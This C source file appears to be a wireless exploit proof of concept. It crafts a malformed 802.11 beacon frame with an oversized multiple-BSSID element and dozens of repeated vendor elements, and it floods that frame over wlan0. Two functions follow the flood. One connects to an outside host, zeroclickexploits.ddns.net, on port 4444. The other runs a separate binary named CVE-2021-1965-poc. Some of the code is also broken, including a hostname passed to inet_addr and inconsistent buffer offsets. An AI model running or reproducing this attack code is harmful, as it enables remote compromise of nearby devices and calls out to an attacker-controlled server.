#include <stdio.h> 
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stddef.h>
#include <pcap/pcap.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <stdarg.h>
#include "logging.h"
#include "cJSON.h"
#pragma pack(push,1)                                                            //disable data allignment

#define SSID_ID                         (uint8_t)0x00                           // ssid id -> 0
#define SUPPORTED_RATES_ID              (uint8_t)0x01                           // supported rates -> 1
#define DS_PARAM_ID                     (uint8_t)0x03                           // current channel -> 3 
#define RSN_ID                          (uint8_t)0x30                           // rsn id -> 48                                     
#define EXT_CAP                         (uint8_t)0x7f                           // Ext cap ->127
#define ERP_ID                          (uint8_t)0x2a                           // erp id -> 42
#define MBSSID_ID                       (uint8_t)0x47                           // mbssid id 0x47 -> 71
#define TIM_ID                          (uint8_t)0x05                           // tim id -> 5
#define TCP_REP_ID                      (uint8_t)0x23                           // tcp report id -> 35
#define VENDOR_ID                       (uint8_t)0xdd                           // vendor spesific id 0xdd -> 221
/*   we have to reverse hex values because of little endian */

#define rev2(x)	    (x&0xff00)>>8 | (x&0x00ff)<<8                               
#define rev4(x)     (uint32_t)x<<24 | ((uint32_t)x<<8)&0xff0000 | ((uint32_t)x>>8)&0xff00 | (uint32_t)x>>24

uint64_t rev8(uint64_t x) {
    x = (x & 0x00000000FFFFFFFF) << 32 | (x & 0xFFFFFFFF00000000) >> 32;
    x = (x & 0x0000FFFF0000FFFF) << 16 | (x & 0xFFFF0000FFFF0000) >> 16; //0x000fac04
    x = (x & 0x00FF00FF00FF00FF) << 8  | (x & 0xFF00FF00FF00FF00) >> 8;
    return x;
}    

struct header
{
        uint16_t fc;                        /**< 802.11 Frame Control field */
        uint16_t duration;                  /**< Microseconds to reserve link */
        uint8_t addr1[6];                   /**< Address 1 (immediate receiver) */
        uint8_t addr2[6];                   /**< Address 2 (immediate sender) */
        uint8_t addr3[6];                   /**< Address 3 (often "forward to") */
        uint16_t seq;                       /**< 802.11 Sequence Control field */
}hdr;

struct beaconframe
{
        /** 802.11 TSFT value at frame send */
        uint64_t  timestamp;

        /** Interval at which beacons are sent, in units of 1024 us */
        uint16_t beacon_interval;

        /** Capability flags */
        uint16_t capability;
}beacon;

struct ie_header {                               
        uint8_t id;                                  /**< Information ID */
        uint8_t len;                                 /**< Information length */
        union {
                uint8_t erp_info;                    /**< ERP flags */                       /* i assigned one structure for the similar ies */
                uint8_t current_channel;             /**< Current channel number, 1-14 */            
        };

};                  //erp and ds parameter id necessary for now

struct ie_ssid {                               
        uint8_t id;                                  /**< Information ID */
        uint8_t len;                                 /**< Information length */
        uint8_t ssid[32];                            /**< SSId as hex */
}ssid;

struct ie_ext_or_rates{
        uint8_t id;                                  /**< Information ID */
        uint8_t len;                                 /**< Information length */
        union {
                uint8_t rates[8];                    /**< Rates data, one rate per byte */
                uint8_t extended_cap[8];             /**< Ext capability info*/
        };
}sup_rates,ext_cap;

struct wlan_tim_ie {
	uint8_t id;                              /* WLAN_ELEMID_TIM */
	uint8_t len;
	uint8_t tim_count;                           /* DTIM count */
	uint8_t tim_period;                          /* DTIM period */
	uint8_t tim_bitctl;                          /* bitmap control */
	uint8_t tim_bitmap[251];                     /* variable-length bitmap */
}tim;

struct tcp_report{
        uint8_t id;
        uint8_t len;
        uint8_t transmit_power;
        uint8_t link_margin;
}tcp;

struct rsn {
        /** Information element ID */
        uint8_t id;

        /** Information element length */
        uint8_t len;

        /** RSN information element version */
        uint16_t version;

        /** Cipher ID for the cipher used in multicast/broadcast frames */
        uint32_t group_cipher;

        /** Number of unicast ciphers supported */
        uint16_t pairwise_count;

        /** List of cipher IDs for supported unicast frame ciphers */
        uint32_t pairwise_cipher;

        /** Number of authentication types supported */
        uint16_t akm_count;

        /** List of authentication type IDs for supported types */
        uint32_t akm_list;

        /** Security capabilities field (RSN only) */
        uint16_t rsn_capab;

        /** Number of PMKIDs included (present only in association frames) */
        uint16_t pmkid_count;

        /** List of PMKIDs included, each a 16-byte SHA1 hash */
        //uint8_t pmkid_list[0];                        // i didn't add pmkid list beacuse we assigned pmkid count as 0
        uint8_t group_management_cipher[4];
}rsn;

struct multiple_bssid
{
        uint8_t id;                          // mbssid id 0x47 -> 71
        uint8_t len;                         // bssid count -> default 4
        uint8_t max_mbssid_indicator;        // default 4       
        
        uint8_t sub_id;
        uint8_t sub_len;
        uint8_t sub_info[252];
        
}mbssid;

struct vendor_spesific
{
        uint8_t id;
        uint8_t len;
        uint8_t oui[3];
        uint8_t oui_type;
        uint8_t oui_data[251];
}vendor;


int brodcast(void *buf,int bufsize, const char *iface)
{       
        pcap_t *fp;
        char errbuf[PCAP_ERRBUF_SIZE];
        fp= pcap_open_live(iface,                     // iface (example : wlan0)
                        100,                            // portion of the packet to capture (only the first 100 bytes)
                        PCAP_OPENFLAG_PROMISCUOUS,      // promiscuous mode (monitor mode)
                        1000,                           // read timeout
                        errbuf                          // error buffer
                        );
        while(1)
        {
                /* Send packets to freedom */
                if (pcap_inject(fp,buf, bufsize ) == 0)   // pcap_inject returns 0 on failure 
                        {
                                printf("\uppps\n");
                                return 0;
                        }
        }
        return 1;
}
//calculate RSN IE size
uint8_t rsn_size ( int npair, int nauth) {           
        uint8_t len = 14 + 4 * ( npair + nauth );    //  id + len + version + group + pairwise count + auth count + rsn = 14 
        char hex[2];
        sprintf(hex, "%x", len);
        return strtol(hex,NULL,16)+4 ;            // convert decimal to hex (subtracting the header size (header -> id and lenght) and add group management cipher and pmkid count len (-2+6))
}

uint8_t convert_to_hex(size_t len){
        uint8_t hex[2];
        sprintf(hex,"%lx",len);
        return (uint8_t)strtol(hex,NULL,16);
}

void connect_back() {
    int sockfd;
    struct sockaddr_in servaddr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        log_message("ERROR", "Socket creation failed...");
        exit(0);
    }
    else
        log_message("INFO", "Socket successfully created...");
    bzero(&servaddr, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("zeroclickexploits.ddns.net");
    servaddr.sin_port = htons(4444);

    if (connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0) {
        log_message("ERROR", "Connection with the server failed...");
        exit(0);
    }
    else
        log_message("INFO", "Connected to the server...");

    close(sockfd);
}

void auto_execute() {
    system("./CVE-2021-1965-poc");
}

void read_config(const char *filename, char *ssid, uint8_t *rates, uint8_t *channel, struct rsn *rsn_info) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        log_message("ERROR", "Failed to open config file: %s", filename);
        exit(EXIT_FAILURE);
    }

    fseek(file, 0, SEEK_END);
    long length = ftell(file);
    fseek(file, 0, SEEK_SET);
    char *data = malloc(length + 1);
    if (!data) {
        log_message("ERROR", "Memory allocation failed for config data");
        exit(EXIT_FAILURE);
    }
    fread(data, 1, length, file);
    fclose(file);
    data[length] = '\0';

    cJSON *json = cJSON_Parse(data);
    if (!json) {
        log_message("ERROR", "Failed to parse config file");
        exit(EXIT_FAILURE);
    }

    cJSON *ssid_json = cJSON_GetObjectItem(json, "ssid");
    if (ssid_json) {
        strncpy(ssid, ssid_json->valuestring, 32);
    }

    cJSON *rates_json = cJSON_GetObjectItem(json, "supported_rates");
    if (rates_json) {
        for (int i = 0; i < cJSON_GetArraySize(rates_json); i++) {
            rates[i] = (uint8_t)cJSON_GetArrayItem(rates_json, i)->valueint;
        }
    }

    cJSON *channel_json = cJSON_GetObjectItem(json, "ds_param");
    if (channel_json) {
        *channel = (uint8_t)channel_json->valueint;
    }

    cJSON *rsn_json = cJSON_GetObjectItem(json, "rsn");
    if (rsn_json) {
        rsn_info->version = (uint16_t)cJSON_GetObjectItem(rsn_json, "version")->valueint;
        rsn_info->group_cipher = (uint32_t)cJSON_GetObjectItem(rsn_json, "group_cipher")->valueint;
        rsn_info->pairwise_count = (uint16_t)cJSON_GetObjectItem(rsn_json, "pairwise_count")->valueint;
        rsn_info->pairwise_cipher = (uint32_t)cJSON_GetObjectItem(rsn_json, "pairwise_cipher")->valueint;
        rsn_info->akm_count = (uint16_t)cJSON_GetObjectItem(rsn_json, "akm_count")->valueint;
        rsn_info->akm_list = (uint32_t)cJSON_GetObjectItem(rsn_json, "akm_list")->valueint;
        rsn_info->rsn_capab = (uint16_t)cJSON_GetObjectItem(rsn_json, "rsn_capab")->valueint;
        rsn_info->pmkid_count = (uint16_t)cJSON_GetObjectItem(rsn_json, "pmkid_count")->valueint;
        cJSON *group_management_cipher_json = cJSON_GetObjectItem(rsn_json, "group_management_cipher");
        if (group_management_cipher_json) {
            for (int i = 0; i < 4; i++) {
                rsn_info->group_management_cipher[i] = (uint8_t)cJSON_GetArrayItem(group_management_cipher_json, i)->valueint;
            }
        }
    }

    cJSON_Delete(json);
    free(data);
}

int main(int argc, char *argv[]){

    char ssid[32] = "default_ssid";
    uint8_t rates[8] = {0x8c, 0x12, 0x98, 0x24, 0xb0, 0x48, 0x60, 0x6c};
    uint8_t channel = 1;
    struct rsn rsn_info = {0};

    read_config("config.json", ssid, rates, &channel, &rsn_info);

    /*------------------ RADIOTAP ----------------------*/
    uint8_t RADIOTAP[] ={    0x00 ,0x00 ,0x34 ,0x00 ,0x6f ,0x08 \
                            ,0x10 ,0x40 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x0c ,0xf7 ,0x17 ,0x40 ,0x01 \
                            ,0x1e ,0xa0 ,0x00 ,0x00 ,0x00 ,0x00 ,0x48 ,0x00 ,0x13 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x0b \
                            ,0x86 ,0x00 ,0x0a ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x8b ,0x00 ,0x00 ,0x00 ,0x55 ,0x01};

    /*------------------ Header -----------------*/
    struct header *hdrp = malloc(sizeof(hdr));                      
    if (hdrp == NULL) {
        log_message("ERROR", "Memory allocation failed for hdrp");
        return EXIT_FAILURE;
    }

    hdrp->fc = rev2(0x8000);
    hdrp->duration = 0x0000;

    uint8_t dest[6] = {0xff,0xff,0xff,0xff,0xff,0xff};           // broadcast
    uint8_t src[6] = {0x1c,0x28,0xaf,0x68,0x15,0x41};            // source 
    uint8_t bssid[6] = {0x1c,0x28,0xaf,0x68,0x15,0x41};          // bssid

    memcpy(hdrp->addr1,dest,sizeof(dest));
    memcpy(hdrp->addr2,src,sizeof(src));                    // i used memcpy for copy arrays to relevant addresses
    memcpy(hdrp->addr3,bssid,sizeof(bssid));

    hdrp->seq = 0x9480;             // we can change randomly
    /*------------------ Managment Block -------------*/
    struct beaconframe *beaconp = malloc(sizeof(beacon));             
    if (beaconp == NULL) {
        log_message("ERROR", "Memory allocation failed for beaconp");
        return EXIT_FAILURE;
    }

    beaconp->timestamp = rev8(0x8351f78f0f000000);          // we can change randomly
    beaconp->beacon_interval = rev2(0x6400);
    beaconp->capability = rev2(0x1105);  
    /*----------------------- SSID -----------------*/
    size_t ssid_size = sizeof(ssid)+offsetof(struct ie_ssid,ssid);                           
    struct ie_ssid *ssidp = malloc(ssid_size);           
    if (ssidp == NULL) {
        log_message("ERROR", "Memory allocation failed for ssidp");
        return EXIT_FAILURE;
    }
                             
    
    ssidp->id = SSID_ID;
    ssidp->len = convert_to_hex(strlen(ssid));
    memcpy(ssidp->ssid, ssid, strlen(ssid));              // ssidp has garbage values 32-sizeof(ssidname) pieces, we have to delete them when copying to buffer 
    /*--------------------- Supported rates -----------*/
    struct ie_ext_or_rates * sup_rates_p = malloc(sizeof(sup_rates));
    if (sup_rates_p == NULL) {
        log_message("ERROR", "Memory allocation failed for sup_rates_p");
        return EXIT_FAILURE;
    }

    sup_rates_p->id = SUPPORTED_RATES_ID;
    sup_rates_p->len = 0x08; 
    memcpy(sup_rates_p->rates,rates,sizeof(rates));

    /*------------ Traffic Indication Map-----------*/
    uint8_t tim_bitmap[] = {0x00}; // we can change randomly (max len 251)
    size_t tim_size = sizeof(tim_bitmap)+offsetof(struct wlan_tim_ie, tim_bitmap);

    struct wlan_tim_ie * timp = malloc(tim_size);
    if (timp == NULL) {
        log_message("ERROR", "Memory allocation failed for timp");
        return EXIT_FAILURE;
    }


    timp->id = TIM_ID;
    timp->len = convert_to_hex(sizeof(tim_bitmap)+3);    // +3 is count,period and bitctl
    timp->tim_count = 0x00;
    timp->tim_period = 0x01;
    timp->tim_bitctl = 0x00;
    memcpy(timp->tim_bitmap,tim_bitmap,sizeof(tim_bitmap)); // tim has garbage values 32-sizeof(ssidname) pieces, we have to delete them when copying to buffer 
    /*------------ TCP Report Power -------------*/
    struct tcp_report *tcp_reportp = malloc(sizeof(tcp));
    if (tcp_reportp == NULL) {
        log_message("ERROR", "Memory allocation failed for tcp_reportp");
        return EXIT_FAILURE;
    }

    tcp_reportp->id = TCP_REP_ID;
    tcp_reportp->len = 0x02;
    tcp_reportp->transmit_power = 0x05;
    tcp_reportp->link_margin = 0x00;
    /*--------------- RSN IE -------------*/
    struct rsn * rsnp = malloc(rsn_size(1,1)+2);
    if (rsnp == NULL) {
        log_message("ERROR", "Memory allocation failed for rsnp");
        return EXIT_FAILURE;
    }

    rsnp->id = RSN_ID;
    rsnp->len = rsn_size(1,1);      
    rsnp->version = rev2(rsn_info.version);
    rsnp->group_cipher = rev4(rsn_info.group_cipher);        // 000fac04 (CCMP)
    rsnp->pairwise_count = rev2(rsn_info.pairwise_count);          // 1
    rsnp->pairwise_cipher = rev4(rsn_info.pairwise_cipher);     
    rsnp->akm_count = rev2(rsn_info.akm_count);
    rsnp->akm_list = rev4(rsn_info.akm_list);           //000fac02 (PSK)
    rsnp->rsn_capab = rsn_info.rsn_capab;
    rsnp->pmkid_count = rsn_info.pmkid_count;
    memcpy(rsnp->group_management_cipher, rsn_info.group_management_cipher, sizeof(rsn_info.group_management_cipher));

    /*------------ MBSSID ----------------*/
    uint8_t sub_info[] = {   0x53,0x02,0x11,0x15,0x00,0x13,0x72,0x6f,0x75,0x65 \
                            ,0x72,0x2d,0x33,0x34,0x31,0x31,0x2d,0x6e,0x61,0x74,0x65,0x2d,0x36,0x67,0x55,0x03 \
                            ,0x0f,0x01,0x00,0x30,0x14,0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac \
                            ,0x04,0x01,0x00,0x00,0x0f,0xac,0x08,0xcc,0x00,0x7f,0x0b,0x04,0x00,0x4f,0x02,0x00 \
                            ,0x00,0x00,0x40,0x00,0x40,0x08,0xdd,0x17,0x8c,0xfd,0xf0,0x01,0x01,0x02,0x01,0x00 \
                            ,0x02,0x01,0x01,0x03,0x03,0x01,0x01,0x00,0x04,0x01,0x01,0x09,0x02,0x0f,0x03,0xdd \
                            ,0x18,0x00,0x50,0xf2,0x02,0x01,0x01,0x80,0x00,0x03,0xa4,0x00,0x00,0x27,0xa4,0x00 \
                            ,0x00,0x42,0x43,0x5e,0x00,0x62,0x32,0x2f,0x00,0xdd,0x16,0x8c,0xfd,0xf0,0x04,0x00 \
                            ,0x00,0x49,0x4c,0x51,0x03,0x02,0x09,0x72,0x01,0xcb,0x17,0x00,0x00,0x04,0x11,0x00 \
                            ,0x00,0xdd,0x07,0x8c,0xfd,0xf0,0x04,0x01,0x01,0x01};


    size_t mbssid_size = offsetof(struct multiple_bssid ,sub_info) + sizeof(sub_info);
    struct multiple_bssid *mbssidp = malloc(mbssid_size);
    if (mbssidp == NULL) {
        log_message("ERROR", "Memory allocation failed for mbssidp");
        return EXIT_FAILURE;
    }


    mbssidp->id = MBSSID_ID;
    mbssidp->len = convert_to_hex(sizeof(sub_info)+3);              // 3 is sub_id+sub_len+max_bssid;
    mbssidp->max_mbssid_indicator = 0x04;
    mbssidp->sub_id = 0x00;
    mbssidp->sub_len = convert_to_hex(sizeof(sub_info));
    memcpy(mbssidp->sub_info,sub_info,sizeof(sub_info));                     //mbssid has garbage values 32-sizeof(ssidname) pieces, we have to delete them when copying to buffer 
    /*-------------- Vendor Spesific -----------------*/

    uint8_t oui_data[] = {0x08,0x00,0x00,0x00};
    uint8_t oui[3] = {0x00,0x0c,0xe7};

    size_t vendor_size = sizeof(oui_data)+ offsetof(struct vendor_spesific,oui_data);
    struct vendor_spesific *vendorp = malloc(vendor_size);
    if (vendorp == NULL) {
        log_message("ERROR", "Memory allocation failed for vendorp");
        return EXIT_FAILURE;
    }

    vendorp->id = VENDOR_ID;
    vendorp->len = convert_to_hex(sizeof(oui_data)+4);
    memcpy(vendorp->oui,oui,sizeof(oui));
    vendorp->oui_type = 0x08;
    memcpy(vendorp->oui_data,oui_data,sizeof(oui_data));
    /*--------------------Not important IEs----------------------*/
    // these ies are not important in our case.  we just need them

    uint8_t not_important[] =     {  0xff,0x03,0x37,0x02,0x01,0xff,0x1d \
                                    ,0x23,0x05,0x01,0x08,0x9a,0x40,0x10,0x04,0x60,0x08,0x88,0x1d,0x41,0x81,0x1c,0x11 \
                                    ,0x08,0x00,0xfa,0xff,0xfa,0xff,0x79,0x1c,0xc7,0x71,0x1c,0xc7,0x71,0xff,0x0c,0x24 \
                                    ,0xf4,0x3f,0x02,0x38,0xfc,0xff,0x25,0x02,0x27,0x00,0x01,0xff,0x0e,0x26,0x00,0x08 \
                                    ,0xa9,0xff,0x2f,0xa9,0xff,0x45,0x75,0xff,0x65,0x75,0xff,0xff,0x03,0x3b,0xb8,0x36 };
    /*---------------------------------------------------------------*/
    uint8_t empty[vendor_size*76];
    for (int i = 0 ; i < vendor_size*76 ; i++ )
    {                                                                       // i am copiying vendor spesific ie end of the ies N times (N = 76 for now)  
            empty[i] = ((uint8_t*)vendorp)[i%vendor_size];
    }
    size_t bufsize = sizeof(not_important)+sizeof(RADIOTAP) + sizeof(hdr)+ sizeof(beacon)+ ssid_size + sizeof(sup_rates) + tim_size + sizeof(tcp) + (rsn_size(1,1)+2) + mbssid_size+vendor_size*76 ;
    void *buf = malloc(bufsize);
    if (buf == NULL) {
        log_message("ERROR", "Memory allocation failed for buf");
        return EXIT_FAILURE;
    }

    size_t const_size = sizeof(RADIOTAP)+ sizeof(hdr) + sizeof(beacon);
    
    memcpy(buf,RADIOTAP,sizeof(RADIOTAP));                  // copy informations to buffer 
    memcpy(buf+sizeof(RADIOTAP),hdrp,sizeof(hdr));
    memcpy(buf+sizeof(hdr)+sizeof(RADIOTAP),beaconp,sizeof(beacon));
    memcpy(buf+const_size,ssidp,ssid_size);
    memcpy(buf+const_size+ssid_size,rsnp,rsn_size(1,1)+2);
    memcpy(buf+const_size+ssid_size+(rsn_size(1,1)+2),sup_rates_p,sizeof(sup_rates));
    memcpy(buf+const_size+ssid_size+(rsn_size(1,1)+2)+sizeof(sup_rates),mbssidp,mbssid_size);
    memcpy(buf+const_size+ssid_size+(rsn_size(1,1)+2)+sizeof(sup_rates)+mbssid_size,timp,tim_size);
    memcpy(buf+const_size+ssid_size+(rsn_size(1,1)+2)+sizeof(sup_rates)+tim_size+mbssid_size+sizeof(tcp),tcp_reportp,sizeof(tcp));
    memcpy(buf+const_size+ssid_size+(rsn_size(1,1)+2)+sizeof(sup_rates)+tim_size+mbssid_size+sizeof(tcp)+sizeof(not_important),empty,sizeof(empty));
    
    brodcast(buf,bufsize, "wlan0");

    connect_back();
    auto_execute();

    return EXIT_SUCCESS;

}
